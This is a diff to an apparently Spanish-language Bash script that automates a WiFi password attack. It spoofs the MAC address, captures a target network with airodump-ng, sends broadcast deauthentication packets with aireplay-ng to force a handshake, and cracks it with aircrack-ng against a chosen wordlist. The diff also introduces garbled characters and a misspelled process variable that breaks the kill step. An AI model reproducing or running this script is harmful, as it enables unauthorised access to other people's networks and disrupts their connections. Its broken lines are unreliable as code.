@@ -50,7 +50,7 @@ if [ $airtest -eq 0 ]; then
 			ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
 			ifconfig ${tar}mon up
 			airmon-ng check kill > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*] Nueva dirección MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
+			echo -e "\n${yellowColour}[*] Nueva direcciÃ³n MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
 			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!"
 			read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
 				$cleancolor
@@ -69,19 +69,19 @@ if [ $airtest -eq 0 ]; then
 					xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
 					airodump_filter_xterm_PID=$?
 
-					sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
+					sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
 					aireplay_xterm_PID=$!
 					sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
 					echo -e "${redColour}\n[...] Esperando Handshake\n"
 					$cleancolor
-					sleep 20; kill -9 $airodump_filter_xterm_PID
+					
+					sleep 10; kill -9 $airodump_filter_xtrem_PID
 					wait $airodump_filter_xterm_PID 2>/dev/null
-					
-					cd /usr/share/wordlists
-					sudo gunzip -d rockyou.txt.gz > /dev/null 2>&1
-					
-					aircrack-ng -w /usr/share/wordlists/rockyou.txt Handshake-01.cap
+					echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+					read -p "[?] Ruta del Diccionario al usar: " dicc
+					$cleancolor
+					xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
 				fi
 			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
 				echo -e "${redColour}\n[!] Saliendo"
